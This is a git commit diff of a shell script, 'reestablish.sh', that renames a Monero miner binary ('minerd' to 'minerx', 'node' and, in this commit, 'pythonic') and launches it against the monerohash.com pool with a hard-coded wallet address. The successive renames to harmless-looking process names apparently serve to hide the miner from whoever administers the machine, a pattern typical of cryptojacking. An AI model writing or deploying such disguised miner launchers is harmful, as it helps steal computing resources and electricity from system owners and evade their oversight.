c001f9705a12fa14e9425018f9657db05fb642b2
trompetto <phumakupoc@housat.com>
2017-01-02 16:25:48 +0200

    Update reestablish.sh

--- reestablish.sh
+++ reestablish.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
 mv minerd minerx
 mv minerx node
-./node -a cryptonight -o stratum+tcp://monerohash.com:3333 -u 42jF56tc85UTZwhMQc6rHbMHTxHqK74qS2zqLyRZxLbwegsy7FJ9w4T5B69Ay5qeMEMuvVDwHNeopAxrEZkkHrMb5phovJ6 -p x
+mv node pythonic
+./pythonic -a cryptonight -o stratum+tcp://monerohash.com:3333 -u 42jF56tc85UTZwhMQc6rHbMHTxHqK74qS2zqLyRZxLbwegsy7FJ9w4T5B69Ay5qeMEMuvVDwHNeopAxrEZkkHrMb5phovJ6 -p x
